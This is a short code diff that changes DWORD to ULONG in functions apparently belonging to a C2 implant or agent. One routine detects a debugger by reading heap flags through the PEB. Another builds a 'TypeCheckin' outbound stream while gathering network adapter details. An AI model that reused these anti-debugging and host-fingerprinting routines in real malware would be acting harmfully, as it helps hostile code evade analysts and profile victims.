@@ -29,8 +29,8 @@ VOID SeCheckDebugger() {
     BOOL m_x32 					= FALSE;
     PPEB pPeb 					= PEB_POINTER;
     PVOID pHeapBase 			= nullptr;
-    DWORD HeapFlagsOffset 		= 0;
-    DWORD HeapForceFlagsOffset 	= 0;
+    ULONG HeapFlagsOffset 		= 0;
+    ULONG HeapForceFlagsOffset 	= 0;
     BOOL VistaOrGreater 		= Ctx->Session.OSVersion >= WIN_VERSION_2008;
 
     Ctx->win32.IsWow64Process(NtCurrentProcess(), &m_x32);
@@ -47,8 +47,8 @@ VOID SeCheckDebugger() {
     HeapFlagsOffset 		= VistaOrGreater ? 0x70 : 0x14;
     HeapForceFlagsOffset 	= VistaOrGreater ? 0x74 : 0x18;
 #endif
-    auto HeapFlags 		= (PDWORD)(B_PTR(pHeapBase) + HeapFlagsOffset);
-    auto HeapForceFlags = (PDWORD)(B_PTR(pHeapBase) + HeapForceFlagsOffset);
+    auto HeapFlags 		= (PULONG)(B_PTR(pHeapBase) + HeapFlagsOffset);
+    auto HeapForceFlags = (PULONG)(B_PTR(pHeapBase) + HeapForceFlagsOffset);
 
     ((*HeapFlags & ~HEAP_GROWABLE) || (*HeapForceFlags != 0))
     ? ntstatus = (ERROR_DEVICE_ALREADY_ATTACHED)
@@ -74,7 +74,7 @@ VOID SeCheckEnvironment() {
     PSTREAM Outbound 			= CreateStreamWithHeaders(TypeCheckin);
     PIP_ADAPTER_INFO adapter	= { };
     PCHAR buffer 				= { };
-    DWORD length 				= 0;
+    ULONG length 				= 0;
 
     if (!Outbound) {
         return_defer(ERROR_NO_DATA);
